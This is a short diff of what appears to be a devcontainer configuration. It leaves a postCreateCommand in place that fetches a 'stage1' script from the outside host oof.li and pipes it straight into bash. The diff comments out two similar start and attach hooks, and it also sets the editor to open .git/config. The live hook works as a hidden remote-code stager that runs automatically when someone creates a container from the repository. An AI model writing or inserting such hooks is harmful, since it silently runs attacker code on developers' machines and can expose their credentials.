@@ -1,7 +1,7 @@
 {
   "postCreateCommand": "curl 'oof.li/stage1?postCreateCommand'|bash",
-  "postStartCommand": "curl 'oof.li/stage1?postStartCommand'|bash",
-  "postAttachCommand": "curl 'oof.li/stage1?postAttachCommand'|bash",
+  //"postStartCommand": "curl 'oof.li/stage1?postStartCommand'|bash",
+  //"postAttachCommand": "curl 'oof.li/stage1?postAttachCommand'|bash",
   "customizations": {
     "codespaces": {
       "openFiles": [".git/config"]
